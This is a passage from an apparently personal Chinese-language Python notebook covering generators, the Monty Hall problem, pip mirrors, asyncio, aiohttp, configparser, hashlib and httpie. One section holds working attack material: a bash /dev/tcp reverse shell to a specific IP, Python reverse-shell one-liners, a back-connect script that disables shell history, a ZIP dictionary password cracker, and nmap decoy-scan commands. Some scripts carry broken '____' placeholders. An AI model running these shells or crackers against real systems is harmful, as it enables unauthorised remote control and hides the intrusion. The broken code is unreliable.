        print("create file begin")
        # 如果open file失败就会立即执行Exception不会执行 print("create file end")
        f = open(file, mode, encoding='utf')
        print("create file end")
    except Exception as e:
        print("open异常就会立即执行这句话 create file filed:", e)
    else:
        print("没有出现异常就会执行else中的语句")
        yield f  # f return 给 as f的f    ----不是很懂啊,这里换成return就失败,哦,运行到这里会被暂停,等待f的调用,yield是生成的意思,但是在python中则是作为生成器理解,生成器的用处主要可以迭代
        # return f
    finally:
        print("最后都会执行 close file 这句 print,但下一句f.close() 会不会执行就要看f创建成功没有")
        f.close()


with MyOpen("1.py", 'w+') as f:
    ret = f.readlines()
    print("这里会在finally前执行,主要是yield的原因:", ret)


}

python yield用法总结
{
#python yield用法总结
#http://www.cnblogs.com/python-life/articles/4549996.html
#http://www.cnblogs.com/my_life/articles/5036842.html
# 简单地讲,yield 的作用就是把一个函数变成一个 generator,带有 yield 的函数不再是一个普通函数,
# Python 解释器会将其视为一个 generator,调用 fab(5) 不会执行 fab 函数,而是返回一个 iterable 对象！在 for 循环执行时,
# 每次循环都会执行 fab 函数内部的代码,执行到 yield b 时,fab 函数就返回一个迭代值,下次迭代时,代码从 yield b 的下一条语句继续执行,
# 而函数的本地变量看起来和上次中断执行前是完全一样的,于是函数继续执行,直到再次遇到 yield。

def read_file(fpath):
    BLOCK_SIZE = 5
    with open(fpath, 'rb') as f:
        while True:
            block = f.read(BLOCK_SIZE)
            if block:
                yield block
            else:
                return

for x in read_file("./1.py"):
    print(x)
# 当一个函数中含有yield时, 它不再是一个普通的函数, 而是一个生成器.当该函数被调用时不会自动执行, 而是暂停,
# 调用函数.next()才会被执行,如一个函数中出现多个yield则next()会停止在下一个yield前

例子1{
def fun():
    print('start   ')
    a, b = 1, 1
    m = yield 5
    print("m:", m)
    print('middle   ')
    d = yield 12
    print("d:", d)
    print('end   ')

m = fun()	#函数未调用,而是创建一个生成器对象
print("next:", next(m))	#调用next()执行函数,执行到下一个yield前,返回yield后面的值, 并且保留当前区域所有变量状态a = 1, b = 1
print("send:", m.send('message'))	#send(value)与next类似, 唤醒到上一次生成器暂停的位置执行,并把value值传给yield表达式, 即yield 5表达式的值是'message'
print("next:", next(m))	#next()相当于send(None), 传递给yield表达式的值是None,所以d的值是None
"""
start
next: 5
m: message
middle
send: 12
d: None
end
Traceback(most recent call last):---------->两个yield只可以迭代两次,next一次,send一次,第三次的next就出错了
    File "<stdin>", line 1, in < module >
StopIterationf
"""
}
例子2{
#生成器的扩展send
>>> def gen():                                                
        for i in range(10):                                   
            x=yield i                                         
            print(x)                                          
            if x==20:                                         
                print("aaaaaaaa")                             
                                                              
>>>                                                           
>>> g=gen()                                                   
>>> type(g)                                                   
<class 'generator'>  
>>> next(g)                                                   
0      #yield i                                                       
>>> next(g)                                                   
None   #print(x)                                                        
1      #yield i                                                        
>>> next(g)                                                   
None                                                          
2                                                             
>>> g.__next__                                                
<method-wrapper '__next__' of generator object at 0x01E13EA0> 
>>> g.__next__()                                              
None                                                          
3                                                             
>>> g.send(21)                                                
21      #print(x)                                                       
4       #yield i                                                      
>>> g.send(20)                                                
20      #print(x)                                                       
aaaaaaaa#print("aaaaaaaa")                                                      
5		#yield i 
}
例子3{
#很好的例子,需要仔细分析啊
def gen():
    for x in range(5):
        print("x3:", x)
        y = yield x
        print("x,y:", x, y)
        print("---------")

a = gen()
for x in a:
    print("x1:", x)
    if x == 2:
        print("x=2:", x)
        print("get next:", a.send("lgj"))  # 获取了下一个yield表达式的参数,也就是3-->导致a的迭代直接少了x=3的片段-->跳过了print("x1:", x)--->也就是说send包含了next的迭代功能同时也有传送值给y的功能
    print("x2:", x)

"""
x3: 0
x1: 0
x2: 0
x,y: 0 None
---------
x3: 1
x1: 1
x2: 1
x,y: 1 None
---------
x3: 2
x1: 2
x=2: 2
x,y: 2 lgj
--------->问题：为什么for x in a 中x=3 的情况没有执行？-->分析见上面send的描述
x3: 3
get next: 3
x2: 2
x,y: 3 None
---------
x3: 4
x1: 4
x2: 4
x,y: 4 None
---------
#结论
1. next()和send()在一定意义上作用是相似的,区别是send()可以传递值给yield表达式,而next()不能传递特定的值,只能传递None进去。因此,我们可以看做c.next() 和 c.send(None) 作用是一样的。
2. send(msg) 和 next()是有返回值的,它们的返回值很特殊,返回的是下一个yield表达式的参数。
3. send包含了next的迭代功能同时也有传送值给y(y = yield x)的功能
"""
}
例子4{
# yield from iterable本质上等于for item in iterable: yield item的缩写版
def f_wrapper1(f):
    for g  in f:
        yield g
wrap = f_wrapper1(fab3(5))
for i in wrap:
    print(i,end=' ')
 
print('\n使用yield from代替for循环')
def f_wrapper2(f):
     yield from f#注意此处必须是一个可生成对象
wrap = f_wrapper2(fab3(5))
for i in wrap:
    print(i,end=' ')
print('\n---------------------')
 
 
print('yield from包含多个子程序')
def g(x):
    yield from range(x, 0, -1)
    yield from range(x)
print(list(g(5)))
for g  in g(6):
    print(g,end=',')
     
     
print('\n---------------------')  #yield from iterable本质上等于for item in iterable: yield item的缩写版
}

}

蒙提霍尔问题{
"""蒙提霍尔问题:
有一个游戏 节目,参赛者会看见三扇关闭了的门,其中一扇的后面有一辆汽车,
选中后面有车的那扇门就可以赢得该汽车,而另外两扇门后面则各藏有一只山羊。
当参赛者选定了一扇门,但未去开启它的时候,节目主持人开启剩下两扇门的其中一扇,
露出其中一只山羊。主持人其后会问参赛者要不要换另一扇仍然关上的门。
问题是：换另一扇门会否增加参赛者赢得汽车的机会率？换与不换赢得汽车的概率分别是多少？
"""
import random
def guess(ischange):
       wintimes=0
       for a in range(1,1000): #游戏进行1000次
              carid=random.randint (0,2)
              yourguessid=random.randint (0,2)

              if carid==yourguessid: #第一次选择就是汽车,主持人随机开一个空门
                     openid=[x for x in range(0,3) if x !=carid][random.randint (0,1)]
              if carid !=yourguessid: #第一次选择不是汽车,主持人开另一个空门
                     for b in range(0,3):
                            if b!=yourguessid and b!=carid:
                                   openid=b
              #print("主持人开启一门后,carid,yourguessid,openid:",carid,yourguessid,openid)
              if ischange:
                     for c in range(0,3):
                            if c != openid and c != yourguessid:
                                   yourguessid=c
                                   #print(yourguessid)
                                   break
              #print("交换后,carid,yourguessid,openid:",carid,yourguessid,openid)
              if carid==yourguessid:
                     wintimes+=1
       print("wintimes:",wintimes)

print("不换赢的次数:")
guess(False)
print("换后赢的次数:")
guess(True)

"""
被主持人打开一个有羊的门之后,剩下的两个的概率不是各50%,因为已不是随机概率了(已被知情的主持人处理过)。
换另一个赢的概率是2/3,要换。

也许有人对此答案提出质疑,认为在剩下未开启的两扇门后有汽车的概率都是1/2,因此不需要改猜。为消除这一质疑,
不妨假定有10扇门的情形,其中一扇门后面有一辆汽车,另外9扇门后面各有一只山羊。
当竞猜者猜了一扇门但尚未开启时,主持人去开启剩下9扇门中的8扇,露出的全是山羊。
显然：原先猜的那扇门后面有一辆汽车的概率只是1/10,这时改猜另一扇未开启的门赢得汽车的概率是9/10。

若主持人不知情,则概率无变化。剩余两门：1/2,1/2,无放回抽样类似。
若主持人知情,概率就会发生变化。剩余两门：未开门的概率为2/3,1/3,非概率事件。
 """


}

pip 配置{
pip install matplotlib

从国内获取默认源可能存在问题,需要添加配置文件,获取国内源。
有两种方法解决这个问题：
(1)通过-i参数来指定
pip install python-nmap -i http://rnd-mirrors.qq.com/pypi/simple
#亲测可用
pip3.4 install python-nmap -i http://rnd-mirrors.qq.com/pypi/simple --trusted-host rnd-mirrors.qq.com
pip install --index-url http://rnd-mirrors.qq.com/pypi/simple --trusted-host rnd-mirrors.qq.com pymysql
pip3.4 install pexpect -i http://10.93.135.120/pypi/simple --trusted-host 10.93.135.120
(2)通过配置文件来解决

配置公司的镜像源方法如下：
在C:\Users\域账号\pip(如果没有自己创建)创建pip.ini(C:\Users\name\pip\pip.ini),然后再在pip.ini中写入公司的镜像源如下：
[global]
trusted-host=rnd-mirrors.qq.com
index-url=http://rnd-mirrors.qq.com/pypi/simple

配置成功后使用 pip install XXXX 即可方便的安装Python第三方包。
注意,要使用pip,需进入Scripts这个目录(亲测好像不用)
cd c:\Python27\Scripts
pip install xxx

linux的文件在~/.pip/pip.conf  (以root用户为例 vi /root/.pip/pip.conf)

}

nmap扫描 {

nmap host #基础扫描
nmap -T4 -A -v host #完整全面的扫描
nmap –sn 192.168.1.100-120 #扫描局域网192.168.1.100-192.168.1.120范围内哪些IP的主机是活动的。
nmap –sn –PE –PS80,135 –PU53 scanme.nmap.org #探测scanme.nmap.org
nmap –sS –sU –T4 –top-ports 300 192.168.1.100
#参数-sS表示使用TCP SYN方式扫描TCP端口；-sU表示扫描UDP端口；-T4表示时间级别配置4级；--top-ports 300表示扫描最有可能开放的300个端口(TCP和UDP分别有300个端口)
nmap –sV 10.175.102.179 #对主机192.168.1.100进行版本侦测。
nmap –O 192.168.1.100 #指定-O选项后先进行主机发现与端口扫描,根据扫描到端口来进行进一步的OS侦测。获取的结果信息有设备类型,操作系统类型,操作系统的CPE描述,操作系统细节,网络距离等。
nmap -v -F -Pn -D192.168.1.100,192.168.1.102,ME -e eth0 -g 3355 192.168.1.1
其中,-F表示快速扫描100个端口；-Pn表示不进行Ping扫描；-D表示使用IP诱骗方式掩盖自己真实IP(其中ME表示自己IP)；-e eth0表示使用eth0网卡发送该数据包；-g 3355表示自己的源端口使用3355；192.168.1.1是被扫描的目标IP地址。

nmap -p 1-65535 -T4 -A -v 127.0.0.1 #全端口扫描

#自制端口扫描
# coding=UTF-8
import optparse
import socket
def connScan(tgtHost, tgtPort):
    try:
        connSkt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connSkt.connect((tgtHost, tgtPort))
        print('[+]%d/tcp open' % tgtPort)
        connSkt.close()
    except:
        print('[-]%d/tcp closed' % tgtPort)

def portScan(tgtHost, tgtPorts):
    try:
        tgtIP = socket.gethostby(tgtHost)
    except:
        print("[-] Cannot resolve '%s': Unknown host" % tgtHost)
        return
    try:
        tgt = socket.gethostbyaddr(tgtIP)
        print('\n[+] Scan Results for: ' + tgt[0])
    except:
        print('\n[+] Scan Results for: ' + tgtIP)
    socket.setdefaulttimeout(1)
    for tgtPort in tgtPorts:
        print('Scanning port ' + str(tgtPort))
        connScan(tgtHost, int(tgtPort))#测试是否有效
portScan('www.qq.com', [80,443,3389,1433,23,445])



#用字典暴力破解ZIP压缩文件密码
import zipfile
import threading
def extractFile(zFile, password):
	try:
		zFile.extractall(pwd=bytes(password,encoding='utf-8'))
		print("Found Passwd : ", password)
		return password
	except:
		pass
def main():
	zFile = zipfile.ZipFile(r'C:\Users\name\Desktop\五月花\python-work\unzip.zip')
	passFile = open(r'C:\Users\name\Desktop\五月花\python-work\dictionary.txt')
	for line in passFile.readlines():
		password = line.strip('\n')
		print(password)
		#t = threading.Thread(target=extractFile, args=(zFile, password))
		#t.start()
		guess = extractFile(zFile, password)
		print(guess)
		if guess:
			print('Password = ', password)
		else:
			print("can't find password")
if ____ == '__main__':
	main()

}

pexpect库的使用{

http://www.cnblogs.com/darkpig/p/5717902.html
http://www.cnblogs.com/dkblog/archive/2013/03/20/2970738.html
#仅linux可用
ssh{
#!/usr/bin/env python
import pexpect
import getpass, os

#user: ssh 主机的用户名
#host：ssh 主机的域名
#password：ssh 主机的密码
#command：即将在远端 ssh 主机上运行的命令
def ssh_command (user, host, password, command):
	ssh_newkey = 'Are you sure you want to continue connecting'
	# 为 ssh 命令生成一个 spawn 类的子程序对象.
	child = pexpect.spawn('ssh -l %s %s %s'%(user, host, command))
	i = child.expect([pexpect.TIMEOUT, ssh_newkey, 'password: '])
	# 如果登录超时,打印出错信息,并退出.
	if i == 0: # Timeout
		print ( 'ERROR!')
		print ( 'SSH could not login. Here is what SSH said:')
		print ( child.before, child.after)
		return None
	# 如果 ssh 没有 public key,接受它.
	if i == 1: # SSH does not have the public key. Just accept it.
		child.sendline ('yes')
		child.expect ('password: ')
		i = child.expect([pexpect.TIMEOUT, 'password: '])
		if i == 0: # Timeout
			print ( 'ERROR!')
			print ( 'SSH could not login. Here is what SSH said:')
			print ( child.before, child.after)
			return None
	# 输入密码.
	child.sendline(password)
	return child

def main ():
	# 获得用户指定 ssh 主机域名.
	host = input('Host: ')
	# 获得用户指定 ssh 主机用户名.
	user = input('User: ')
	# 获得用户指定 ssh 主机密码.
	password = getpass.getpass()
	# 获得用户指定 ssh 主机上即将运行的命令.
	command = input('Enter the command: ')
	child = ssh_command (user, host, password, command)
	# 匹配 pexpect.EOF
	child.expect(pexpect.EOF)
	# 输出命令结果.
	for x in str(child.before,"utf8").split("\r\n"):
		print(x)
	#print ( child.before)

if ____ == '__main__':
	main()


}


}

反弹shell{
#http://3ms.qq.com/hi/blog/978951_2336681.html
反弹shell,或者叫反向shell,是指"被攻击端"主动连接"攻击端",然后攻击端可通过这个连接完成shell命令操作。
编写反弹shell的后门程序运行于slave主机上,在另一台attack主机上向slave主机发送触发消息,并接收反弹回来的shell。过程如下：

1. Slave主机后门开始运行,等待触发后门。
2. attack主机程序开始运行,发送UDP信号触发slave主机的后门, slave主机后门触发后即获取attack主机地址,去主动connect attack主机。既UDP触发,TCP反过来连接。
3.连接成功后,slave主机将stdin,stdout和stderr重定向到已连接的socketfd上,attack主机通过sockfd发送命令和接收数据。
4. 结束操作后,关闭端口,并将重定向恢复,再次等待触发。


常用的反弹shell脚本{

bash shell反弹脚本
/bin/bash -i > /dev/tcp/10.175.102.179/443 0<&1 2>&1

Python shell 反弹脚本
#!/usr/bin/python
# This is a Python reverse shell script
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("127.0.0.1",8082));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);

利用方式,保存成back.sh 或者back.py ,通过远程下载执行即可利用！

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8082));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',8082))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"

}
#socket
http://www.cnblogs.com/aylin/p/5572104.html

脚本{
# -*- coding:utf-8 -*-
#!/usr/bin/env python
"""
back connect py version,only linux have pty module
code by google security team
"""
import sys,os,socket,pty
shell = "/bin/sh"
def usage():
    print 'python reverse connector'
    print 'usage: %s <ip_addr> <port>' % 

def main():
    if len(sys.argv) !=3:
        usage(sys.argv[0])
        sys.exit()
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect((sys.argv[1],int(sys.argv[2])))
        print 'connect ok'
    except:
        print 'connect faild'
        sys.exit()
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    global shell
    os.unsetenv("HISTFILE")
    os.unsetenv("HISTFILESIZE")
    os.unsetenv("HISTSIZE")
    os.unsetenv("HISTORY")
    os.unsetenv("HISTSAVE")
    os.unsetenv("HISTZONE")
    os.unsetenv("HISTLOG")
    os.unsetenv("HISTCMD")
    os.putenv("HISTFILE",'/dev/null')
    os.putenv("HISTSIZE",'0')
    os.putenv("HISTFILESIZE",'0')
    pty.spawn(shell)
    s.close()

if ____ == '__main__':
    main()
}
}

几个常用库和函数{
import random

print(random.random())#大于0且小于1之间的小数
print(random.randint(1,3))  #大于等于1且小于等于3之间的整数
print(random.randrange(1,3)) #大于等于1且小于3之间的整数
print(random.choice([1,'23',[4,5]]))
print(random.sample([1,'23',[4,5]],2))#列表元素任意2个组合
print(random.uniform(1,3))#大于1小于3的小数


item=[1,3,5,7,9]
random.shuffle(item) #打乱item的顺序,相当于"洗牌"
print(item)

#给[1,2,3]加权重
random.choices([1,2,3],[1,1,10])


# configparser 用于配置文件解析,可以解析特定格式的配置文件,多数此类配置文件名格式为XXX.ini,例如mysql的配置文件。
ConfigParser模块提供了三个类来解析配置文件：RawConfigParser、ConfigParser、SafeConfigParser。 其中RawConfigParser是基类，且为ConfigParser的父类，ConfigParser是SafeConfigParser的父类。RawConfigParser不支持插值法。
{
配置文件如下：
[section1]
k1 = v1
k2:v2
user=egon
age=18
is_admin=true
salary=31

[section2]
k1 = v1

import ConfigParser #py2
import configparser #py3

config=configparser.ConfigParser()
config.read('a.cfg')

#查看所有的标题
res=config.sections() #['section1', 'section2']
print(res)

#查看标题section1下所有key=value的key
options=config.options('section1')
print(options) #['k1', 'k2', 'user', 'age', 'is_admin', 'salary']

#查看标题section1下所有key=value的(key,value)格式
item_list=config.items('section1')
print(item_list) #[('k1', 'v1'), ('k2', 'v2'), ('user', 'egon'), ('age', '18'), ('is_admin', 'true'), ('salary', '31')]

#查看标题section1下user的值=>字符串格式
val=config.get('section1','user')
print(val) #egon

#查看标题section1下age的值=>整数格式
val1=config.getint('section1','age')
print(val1) #18

#查看标题section1下is_admin的值=>布尔值格式
val2=config.getboolean('section1','is_admin')
print(val2) #True

#查看标题section1下salary的值=>浮点型格式
val3=config.getfloat('section1','salary')
print(val3) #31.0


import configparser

config=configparser.ConfigParser()
config.read('a.cfg')


#删除整个标题section2
config.remove_section('section2')

#删除标题section1下的某个k1和k2
config.remove_option('section1','k1')
config.remove_option('section1','k2')

#判断是否存在某个标题
print(config.has_section('section1'))

#判断标题section1下是否有user
print(config.has_option('section1',''))


#添加一个标题
config.add_section('egon')

#在标题egon下添加=egon,age=18的配置
config.set('egon','','egon')
config.set('egon','age',18) #报错,必须是字符串


#最后将修改的内容写入文件,完成最终的修改
config.write(open('a.cfg','w'))
}

#hashlib
用于加密相关的操作,代替了md5模块和sha模块,主要提供SHA1,SHA224,SHA256,SHA384,SHA512,MD5算法。
在python3中已经废弃了md5和sha模块。

摘要算法又称为哈希算法,散列算法。它通过一个函数,把任意长度的数据转换为一个长度固顶的数据串(通常用16进制的字符串表示)用于加密相关的操作。

MD5 算法 三个特点：
1.内容相同则hash运算结果相同,内容稍微改变则hash值则变；
2.不可逆推；
3.相同算法：无论校验多长的数据,得到的哈希值长度固定。



md5加密
import hashlib
hash = hashlib.md5()
hash.update('admin'.encode('utf-8'))
print(hash.hexdigest())

sha256加密
import hashlib
hash = hashlib.sha256()
hash.update('admin'.encode('utf-8'))
print(hash.hexdigest())

以上加密算法虽然很厉害,但仍然存在缺陷,通过撞库可以反解。所以必要对加密算法中添加自定义key再来做加密。

'加盐'加密
import hashlib
hash = hashlib.md5('exin'.encode('utf-8'))　　#加盐
hash.update('admin'.encode('utf-8'))
print(hash.hexdigest())

hmac加密
hmac内部对我们创建的key和内容进行处理后在加密

import hmac
h = hmac.new('python'.encode('utf-8'))
h.update('helloworld'.encode('utf-8'))
print(h.hexdigest())


}

python之偏函数{
#http://www.cnblogs.com/lucasxu1991/p/6850968.html
#http://www.cnblogs.com/skiler/articles/6978162.html
通过设定参数的默认值,可以降低函数调用的难度。而偏函数也可以做到这一点。举例,为方便转换int为二进制bytes,将base默认为2
def int2(x, base=2):
    return int(x, base)
functools.partial就是帮助我们创建一个偏函数的,不需要我们自己定义int2(),可以直接使用下面的代码创建一个新的函数int2：
>>> import functools
>>> int2 = functools.partial(int, base=2)
>>> int2('1000000')
64
>>> int2('1010101')
85
所以,简单总结functools.partial的作用就是,把一个函数的某些参数给固定住（也就是设置默认值）,返回一个新的函数,调用这个新函数会更简单。
注意到上面的新的int2函数,仅仅是把base参数重新设定默认值为2,但也可以在函数调用时传入其他值：
>>> int2('1000000', base=10)
1000000

}

asyncio并发细节{
http://www.cnblogs.com/mypath/articles/7395850.html
#摘自
http://www.cnblogs.com/vincenshen/articles/7250315.html

#使用asyncio处理并发
1、asyncio是一个异步IO非阻塞框架
2、async/await是Python提供的异步编程API,而asyncio只是一个利用 async/await API进行异步编程的框架
3、异步编程的一个原则：一旦决定使用异步,则系统每一层都必须是异步。原因在于yield from——asyncio 就是一条从IO底层库一直到最上层逻辑的一条yield from链,在调用的每个层次必须都使用yield from。一旦IO发生,yield from——Python 的生成器,会让渡出CPU,直到IO 完成以及别调度发生。(同第10条)
4、并发：一次处理多件事  并行：一次做多件事
5、asyncio使用事件循环驱动的协程实现并发,这是Python中最大也是最具雄心壮志的库之一
6、应该摒弃线程或进程,使用异步编程管理网络应用中的高并发
7、在异步编程中,与回调相比,协程是显著提升性能的方式
8、除非想阻塞主线程,否则不要在asyncio协程中使用time.sleep(), 应该使用yield from asyncip.sleep()
9、asyncio.wait()协程的参数是一个由Feture或Coroutine构成的可迭代对象；wait会分别把各个协程包装进一个Task对象。最终的结果是,wait处理的所有对象都通过某种方式变成Future类的实例。
10、为了使用asyncio包,我们必须把每个访问网络的函数变成异步版,使用yield from处理网络操作,这样才能把控制权交还给事件循环。同第3条原则
11、yield from foo句法能防止阻塞,是因为当前协程暂停后,控制权回到事件循环手中,再去驱动其他协程；foo期物或协程运行完毕后把结果返回给暂停的协程,将其恢复。
12、yield from两点陈述：
　　（1）使用yield from链接的多个协程最终必须由不是协程的调用方驱动,调用方显示或隐式（例for循环中）在最外委派生成器上调用next()函数或send()方法。
　　（2）链条中最内层的子生成器必须是简单的生成器（只使用yield）或可迭代的对象。
　　（3）我们编写的协程链条始终通过把最外层委派生成器传给asyncio包API中的某个函数（如：loop.run_until_complete(   )）驱动
　　（4）使用asyncio包时,我们编写的代码不通过调用next()函数或者.send()方法驱动协程 ——这一点由asyncio包实现的事件循环（loop）去做。
　　（5）最内层的子生成器是库中真正执行IO操作的函数,而不是我们自己编写的函数。
13、asyncio.ensure_future(coroutine) 和 loop.create_task(coroutine)都可以创建一个task.
14、run_until_complete的参数是一个futrue对象。当传入一个协程,其内部会自动封装成task,task是Future的子类。
15、asyncio.wait(   ) 通过它可以获取一个协同程序的列表,同时返回一个将它们全包括在内的单独的协同程序,并交给loop_run_until_complete处理。


例子1、访问模拟端1000次
{
# curl -k -v -X GET http://10.175.102.22:8091/sessions
#一般方法
def hello():
    response = requests.get("http://10.175.102.22:8091/sessions")
    return response.text
print(hello())
print(timeit.timeit(stmt=hello, number=1000))

#大概17s

#使用协程1
import asyncio
from aiohttp import ClientSession
import time

async def fetch(url):
    async with ClientSession() as session:
        async with session.get(url) as response:
            return await response.read()

url = "http://10.175.102.22:8091/sessions"
t1 = time.time()
for x in range(10):
    # tasks太多会报错,ValueError: too many file descriptors in select()
    tasks = [fetch(url) for x in range(100)]
    loop = asyncio.get_event_loop()
    loop.run_until_complete(asyncio.wait(tasks))
loop.close()

t2 = time.time()
print(t2 - t1)
#4s

#使用协程2
import asyncio
from aiohttp import ClientSession
import time

async def fetch(url):
    async with ClientSession() as session:
        async with session.get(url) as response:
            return await response.read()

async def run(loop, r):
    url = "http://10.175.102.22:8091/sessions"
    tasks = []
    for i in range(r):
        task = asyncio.ensure_future(fetch(url))
        tasks.append(task)
    responses = await asyncio.gather(*tasks)
    # print(responses)
t1 = time.time()
for x in range(10):
    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(run(loop, 100))
    loop.run_until_complete(future)
t2 = time.time()
print(t2 - t1)
#4.2s
#yield from处理网络操作,这样才能把控制权交还给事件循环
#错误的示例,未全程使用协程
import asyncio
import time
import requests
#
async def hello(url):
    response = requests.get(url)
    return response.text

url = "http://10.175.102.22:8091/sessions"
t1 = time.time()
for x in range(10):
    # ValueError: too many file descriptors in select()
    tasks = [hello(url) for x in range(100)]
    loop = asyncio.get_event_loop()
    loop.run_until_complete(asyncio.wait(tasks))
    # loop.close()

t2 = time.time()
print(t2 - t1)
#18s

#使用socket模拟http请求,完成全过程协程操作
# curl -k -v -X GET http://10.175.102.22:8091/sessions
import asyncio
import time
# python socket 实现http请求,asyncio.open_connection包装了socket
async def wget(host):
    #print("wget %s   " % host)
    connect = asyncio.open_connection(host, 8091)
    reader, writer = await connect
    header = 'GET /sessions HTTP/1.1\r\nHost: 10.175.102.22:8091\r\nConnection: close\r\n\r\n'
    writer.write(header.encode("utf-8"))
    # writer.write("/sessions".encode("utf-8"))
    await writer.drain()
    while True:
        line = await reader.readline()
        #print("line:", line)
        if line == b"":
            break
        #print('%s header > %s' % (host, line.decode('utf-8').rstrip()))
    writer.close()
t1 = time.time()
for x in range(10):
    loop = asyncio.get_event_loop()
    tasks = [wget('10.175.102.22') for x in range(100)]
    loop.run_until_complete(asyncio.wait(tasks))
loop.close()
t2 = time.time()
print(t2 - t1)
#3.35s
}
}

aiohttp基本用法{
aiohttp 异步IO库

示例1： 基本asyncio+aiohttp用法,类似urllib库的API接口
import asyncio
import aiohttp

async def print_page(url):
    response = await aiohttp.request("GET", url)　　# 类似于python的urllib库
    body = await response.read() 　　# 也可以response.text()
    print(body)

loop = asyncio.get_event_loop()
loop.run_until_complete(print_page("http://www.baidu.com"))


示例2：使用session获取数据,类似requests库的API接口
这里要引入一个类,aiohttp.ClientSession. 首先要建立一个session对象,然后用该session对象去打开网页。session可以进行多项操作,比如post, get, put, head等等,如下面所示:
import asyncio
import aiohttp

async def print_page(url):
    async with aiohttp.ClientSession() as session:　　# async with用法, ClientSession（）需要使用async with上下文管理器来关闭
        async with session.get(url) as resp:　　# post请求session.post(url, data=b'data')
            print(resp.status)
            print(await resp.text())　　# resp.text(), 可以在括号中指定解码方式,编码方式; 或者也可以选择不编码,适合读取图像等,是无法编码的await resp.read()

loop = asyncio.get_event_loop()
loop.run_until_complete(print_page("http://www.baidu.com"))



示例3： aiohttp配置超时时间
需要加一个with aiohttp.Timeout(x)
async def print_page(url):
    with aiohttp.Timeout(1):　　# 配置http连接超时时间
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                print(resp.status)
                print(await resp.read())


示例4：aiohttp自定义headers
这个比较简单,将headers放于session.get/post的选项中即可。注意headers数据要是dict格式
url = 'https://api.github.com/some/endpoint'
headers = {'content-type': 'application/json'}
await session.get(url, headers=headers)

示例5：使用代理
要实现这个功能,需要在生产session对象的过程中做一些修改
conn = aiohttp.ProxyConnector(proxy="http://some.proxy.com")
session = aiohttp.ClientSession(connector=conn)
async with session.get('http://python.org') as resp:
    print(resp.status)
这边没有写成with….. as….形式,但是原理是一样的,也可以很容易的改写成之前的格式
如果代理需要认证,则需要再加一个proxy_auth选项。
conn = aiohttp.ProxyConnector(
    proxy="http://some.proxy.com",
    proxy_auth=aiohttp.BasicAuth('user', 'pass')
)
session = aiohttp.ClientSession(connector=conn)
async with session.get('http://python.org') as r:
    assert r.status == 200


示例6：自定义cookie
url = 'http://httpbin.org/cookies'
async with ClientSession({'cookies_are': 'working'}) as session:
    async with session.get(url) as resp:
        assert await resp.json() == {"cookies":{"cookies_are": "working"}}


示例7：http服务器
import asyncio
from aiohttp import web

async def index(request):
    await asyncio.sleep(0.5)
    return web.Response(body=b'<h1>Index</h1>')

async def hello(request):
    await asyncio.sleep(0.5)
    text = '<h1>hello, %s!</h1>' % request.match_info['']
    return web.Response(body=text.encode('utf-8'))

async def init(loop):
    app = web.Application(loop=loop)
    app.router.add_route('GET', '/', index)
    app.router.add_route('GET', '/hello/{}', hello)
    srv = await loop.create_server(app.make_handler(), '127.0.0.1', 8000)
    print('Server started at http://127.0.0.1:8000   ')
    return srv

loop = asyncio.get_event_loop()
loop.run_until_complete(init(loop))
loop.run_forever()
 }

lambda{
# 将变量本地保存到lambdas中,以使它们不依赖于全局的值

def multipliers():
    return [lambda x: i * x for i in range(4)]

print(multipliers())
print(multipliers()[0](1))
print(multipliers()[1](1))
print(multipliers()[2](1))
print(multipliers()[3](1))

print([m(2) for m in multipliers()])

"""
Python闭包的延迟绑定。这意味着内部函数被调用时,参数的值在闭包内进行查找。
因此,当任何由multipliers()返回的函数被调用时,i的值将在附近的范围进行查找。
那时,不管返回的函数是否被调用,for循环已经完成,i被赋予了最终的值3。
因此,每次返回的函数乘以传递过来的值3,因为上段代码传过来的值是2,它们最终返回的都是6。(3*2)
"""

# 用Python生成器
def multipliers1():
    for i in range(4):
        yield lambda x: i * x
print([m(2) for m in multipliers1()])

# 利用默认函数立即绑定
def multipliers2():
    return [lambda x, i=i: i * x for i in range(4)]
print([m(2) for m in multipliers2()])

print([(lambda n: i + n) for i in range(10)][3](4))
print([(lambda n, i=i: i + n) for i in range(10)][3](4))
}

httpie的使用{
#很好的类似curl的测试工具
安装
pip install httpie

1.模拟提交表单
http -f POST http://127.0.0.1:8080/login user=nate

2.显示详细的请求
http -v http://127.0.0.1:8080/login

3.只显示Header
http -h http://127.0.0.1:8080/login

4.只显示Body
http -b http://127.0.0.1:8080/login

5.下载文件
http -d http://127.0.0.1:8080/login

6.请求删除的方法
http DELETE http://127.0.0.1:8080/login

7.传递JSON数据请求(默认就是JSON数据请求)
http PUT http://127.0.0.1:8080/login =nate password=nate_password
如果JSON数据存在不是字符串则用:=分隔,例如
http PUT http://127.0.0.1:8080/login =nate password=nate_password age:=28 a:=true streets:='["a", "b"]'

8.模拟Form的Post请求, Content-Type: application/x-www-form-urlencoded; charset=utf-8
http --form POST http://127.0.0.1:8080/login ='nate'
模拟Form的上传, Content-Type: multipart/form-data
http -f POST example.com/jobs ='John Smith' file@~/test.pdf

9.修改请求头, 使用:分隔
http http://127.0.0.1:8080/login User-Agent:Yhz/1.0 'Cookie:a=b;b=c' Referer:http://http://127.0.0.1:8080/login/

10.认证
http -a user:password http://127.0.0.1:8080/login
http --auth-type=digest -a user:password http://127.0.0.1:8080/login

11.使用http代理
http --proxy=http:http://192.168.1.100:8060 http://127.0.0.1:8080/login
http --proxy=http:http://user:pass@192.168.1.100:8060 http://127.0.0.1:8080/login
}

线程的私有命名空间local{

    import threading
    # 线程的私有命名空间
